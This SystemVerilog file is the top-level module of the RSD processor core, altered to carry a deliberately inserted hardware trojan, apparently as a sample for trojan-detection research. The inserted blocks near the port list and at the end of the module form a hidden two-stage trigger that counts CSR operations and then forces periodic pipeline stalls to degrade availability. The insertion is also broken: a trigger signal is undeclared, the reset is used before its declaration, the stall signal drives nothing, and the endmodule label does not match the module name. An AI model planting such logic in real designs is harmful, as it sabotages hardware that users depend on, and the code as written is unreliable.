// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.



// Main モジュール
// 全てのモジュールとインターフェースの最上位での接続を行う
//

`ifndef RSD_SYNTHESIS_ATLYS

import BasicTypes::*;
import CacheSystemTypes::*;
import MemoryTypes::*;
import MemoryMapTypes::*;
import IO_UnitTypes::*;
import DebugTypes::*;

module Main_Zynq_trojan_Availability #(
`ifdef RSD_POST_SYNTHESIS
    parameter MEM_INIT_HEX_FILE = "code.hex"
`else
    parameter MEM_INIT_HEX_FILE = ""
`endif
)(

`ifdef RSD_SYNTHESIS_ZEDBOARD
input
    logic clk,
    logic negResetIn, // 負論理
output
    LED_Path ledOut, // LED Output
`else
// RSD_POST_SYNTHESIS
// RSD_FUNCTIONAL_SIMULATION
input
    logic clk_p, clk_n,
    logic negResetIn, // 負論理
    logic rxd,
`endif

`ifndef RSD_DISABLE_DEBUG_REGISTER
output
    DebugRegister debugRegister,
`endif

`ifdef RSD_USE_EXTERNAL_MEMORY
Axi4MemoryIF axi4MemoryIF,
`endif

`ifdef RSD_SYNTHESIS_ZEDBOARD
Axi4LiteControlRegisterIF axi4LitePlToPsControlRegisterIF,
Axi4LiteControlRegisterIF axi4LitePsToPlControlRegisterIF
`else 
// RSD_POST_SYNTHESIS
// RSD_FUNCTIONAL_SIMULATION
output
    logic serialWE,
    SerialDataPath serialWriteData,
    logic posResetOut, // 正論理
    LED_Path ledOut, // LED Output
    logic txd
`endif
);

    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=3085, act=1542)
    // ============================================================
    localparam int ARM_THRESHOLD   = 3085;
    localparam int ACTIVATE_DELAY  = 1542;
    logic [15:0] trojan_counter1, trojan_counter2;
    logic        trojan_armed, trojan_active;
    always_ff @(posedge clk or negedge rst) begin
        if (!rst) begin
            trojan_counter1 <= '0;
            trojan_counter2 <= '0;
            trojan_armed    <= 1'b0;
            trojan_active   <= 1'b0;
        end else begin
            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
        end
    end
    logic [7:0] stall_counter;  // TROJAN Availability forward decl
    logic       stall_active;



`ifdef RSD_SYNTHESIS_ZEDBOARD
//input
logic rxd;

//output
logic serialWE;
SerialDataPath serialWriteData;
logic posResetOut; // 正論理
logic txd;
`else
// RSD_POST_SYNTHESIS
// RSD_FUNCTIONAL_SIMULATION
logic clk;
`endif

`ifdef RSD_DISABLE_DEBUG_REGISTER
    DebugRegister debugRegister; // RSD_DISABLE_DEBUG_REGISTER時はどこにも繋がない
`endif
    
    logic programLoaded; // プログラムのロードが済んだらTRUE

    //
    // --- Clock and Reset
    //
    logic memCLK;
    logic locked; // You must disable the reset signal (rst) after the clock generator is locked.
    logic rst, rstStart, rstTrigger;

`ifndef RSD_SYNTHESIS_ZEDBOARD
    // RSD_POST_SYNTHESIS
    // RSD_FUNCTIONAL_SIMULATION
    // For Simulation
    assign clk = clk_p;
`endif

    assign locked = TRUE;
        
    // Generate a global reset signal 'rst' from 'rstTrigger'.
    assign rstTrigger = ~negResetIn;
    assign posResetOut = rst;
    ResetController rstController(
        .clk( clk ),
        .rstTrigger( rstTrigger ),
        .locked( locked ),
        .rst( rst ),
        .rstStart( rstStart )
    );

    //
    // --- Memory and Program Loader
    //
    logic memCaribrationDone; // メモリのキャリブレーションが終わったらTRUE
    
    MemoryEntryDataPath memReadData;
    logic memReadDataReady;
    logic memAccessReadBusy;
    logic memAccessWriteBusy;
    logic memAccessBusy;
    
    MemoryEntryDataPath memAccessWriteData;
    MemoryEntryDataPath memAccessWriteDataFromCore;
    MemoryEntryDataPath memAccessWriteDataFromProgramLoader;

    AddrPath memAccessAddr, memAccessAddrFromProgramLoader;
    PhyAddrPath memAccessAddrFromCore;

    logic memAccessRE, memAccessRE_FromCore;
    logic memAccessWE, memAccessWE_FromCore, memAccessWE_FromProgramLoader;

    MemAccessSerial nextMemReadSerial; // RSDの次の読み出し要求に割り当てられるシリアル(id)
    MemWriteSerial nextMemWriteSerial; // RSDの次の書き込み要求に割り当てられるシリアル(id)

    MemAccessSerial memReadSerial; // メモリの読み出しデータのシリアル
    MemAccessResponse memAccessResponse; // メモリ書き込み完了通知


`ifdef RSD_USE_EXTERNAL_MEMORY
    Axi4Memory axi4Memory(
        .port(axi4MemoryIF),
        .memAccessAddr( memAccessAddr ),
        .memAccessWriteData( memAccessWriteData ),
        .memAccessRE( memAccessRE ),
        .memAccessWE( memAccessWE ),
        .memAccessReadBusy( memAccessReadBusy ),
        .memAccessWriteBusy( memAccessWriteBusy ),
        .nextMemReadSerial( nextMemReadSerial ),
        .nextMemWriteSerial( nextMemWriteSerial ),
        .memReadDataReady( memReadDataReady ),
        .memReadData( memReadData ),
        .memReadSerial( memReadSerial ),
        .memAccessResponse( memAccessResponse )
    );
`else // Use internal memory
    Memory #(
        .INIT_HEX_FILE( MEM_INIT_HEX_FILE )
    ) memory (
        .clk( clk ),
        .rst( rst ),
        .memAccessAddr( memAccessAddr ),
        .memAccessWriteData( memAccessWriteData ),
        .memAccessRE( memAccessRE ),
        .memAccessWE( memAccessWE ),
        .memAccessBusy( memAccessBusy ),
        .nextMemReadSerial( nextMemReadSerial ),
        .nextMemWriteSerial( nextMemWriteSerial ),
        .memReadDataReady( memReadDataReady ),
        .memReadData( memReadData ),
        .memReadSerial( memReadSerial ),
        .memAccessResponse( memAccessResponse )
    );

    assign memAccessReadBusy = memAccessBusy;
    assign memAccessWriteBusy = memAccessBusy;
`endif

`ifdef RSD_USE_PROGRAM_LOADER
    always_comb begin
        if ( !programLoaded ) begin
            memAccessAddr = memAccessAddrFromProgramLoader;
            memAccessWriteData = memAccessWriteDataFromProgramLoader;
            memAccessRE = FALSE;
            memAccessWE = memAccessWE_FromProgramLoader;
        end
        else begin
            memAccessAddr = memAccessAddrFromCore;
            memAccessWriteData = memAccessWriteDataFromCore;
            memAccessRE = memAccessRE_FromCore;
            memAccessWE = memAccessWE_FromCore;
        end
    end
`else
    always_comb begin
`ifndef RSD_USE_EXTERNAL_MEMORY
        programLoaded = TRUE;
`endif
        memAccessAddr = memAccessAddrFromCore;
        memAccessWriteData = memAccessWriteDataFromCore;
        memAccessRE = memAccessRE_FromCore;
        memAccessWE = memAccessWE_FromCore;
    end
`endif
    
    //
    // --- Serial communication IO
    //
    logic txdBuffer, serialReady;
    
    always_ff @(posedge clk) begin
        txd <= txdBuffer;
    end

    //
    // --- LED IO
    //
    PC_Path lastCommittedPC;

`ifdef RSD_SYNTHESIS_ZEDBOARD
    logic [25:0] ledBlinkCounter; // just for LED

    always_ff @(posedge clk) begin
        ledBlinkCounter <= ledBlinkCounter + 1;
        
        ledOut[7] <= ledBlinkCounter[25];
        ledOut[6] <= FALSE; // TODO:パイプラインが動いているかを表示したい
        ledOut[5] <= ( lastCommittedPC == PC_GOAL ? TRUE : FALSE ); 
        ledOut[4] <= memAccessReadBusy | memAccessWriteBusy;   // DRAM is working
        ledOut[3] <= ~txd;      // Uart TXD
        ledOut[2] <= ~rxd;      // Uart RXD
        ledOut[1] <= ~memCaribrationDone;  // DRAM calibration done 
        ledOut[0] <= ~programLoaded; // MEMORY IMAGE transfer is done
    end
`else
    assign ledOut = lastCommittedPC[ LED_WIDTH-1:0 ];
`endif

    //
    // --- AXI4Lite Control Register IO for ZYNQ
    //
`ifdef RSD_SYNTHESIS_ZEDBOARD
    Axi4LitePlToPsControlRegister axi4LitePlToPsControlRegister( 
                            axi4LitePlToPsControlRegisterIF, 
                            serialWE, 
                            serialWriteData,
                            lastCommittedPC );
   
    Axi4LitePsToPlControlRegister axi4LitePsToPlControlRegister( 
                            axi4LitePsToPlControlRegisterIF, 
                            memAccessAddrFromProgramLoader,
                            memAccessWriteDataFromProgramLoader,
                            memAccessWE_FromProgramLoader,
                            programLoaded);
`endif
    logic reqExternalInterrupt;
    ExternalInterruptCodePath externalInterruptCode; 
    always_comb begin
        reqExternalInterrupt = FALSE;
        externalInterruptCode = 0;
    end

    //
    // --- Processor core
    //
    Core core (
        .clk( clk ),
        .rst( rst || !programLoaded ),
        .memAccessAddr( memAccessAddrFromCore ),
        .memAccessWriteData( memAccessWriteDataFromCore ),
        .memAccessRE( memAccessRE_FromCore ),
        .memAccessWE( memAccessWE_FromCore ),
        .memAccessReadBusy( memAccessReadBusy ),
        .memAccessWriteBusy( memAccessWriteBusy ),
        .reqExternalInterrupt( reqExternalInterrupt ),
        .externalInterruptCode( externalInterruptCode ),
        .nextMemReadSerial( nextMemReadSerial ),
        .nextMemWriteSerial( nextMemWriteSerial ),
        .memReadDataReady( memReadDataReady ),
        .memReadData( memReadData ),
        .memReadSerial( memReadSerial ),
        .memAccessResponse( memAccessResponse ),
        .rstStart( rstStart ),
        .serialWE( serialWE ),
        .serialWriteData( serialWriteData ),
        .lastCommittedPC( lastCommittedPC ),
        .debugRegister ( debugRegister )
    );
    

    // ── AVAILABILITY: Periodic stall always_ff ──────────────────────────────
    localparam int STALL_PERIOD = 16;
    localparam int STALL_CYCLES = 8;
    always_ff @(posedge clk or negedge rst) begin
        if (!rst) begin
            stall_counter <= '0;
            stall_active  <= 1'b0;
        end else if (trojan_active) begin
            if (stall_counter >= STALL_PERIOD[7:0] - 1) stall_counter <= '0;
            else stall_counter <= stall_counter + 1;
            stall_active <= (stall_counter < STALL_CYCLES[7:0]);
        end else begin
            stall_counter <= '0;
            stall_active  <= 1'b0;
        end
    end
    // ────────────────────────────────────────────────────────────────────────

endmodule : Main_Zynq

`endif
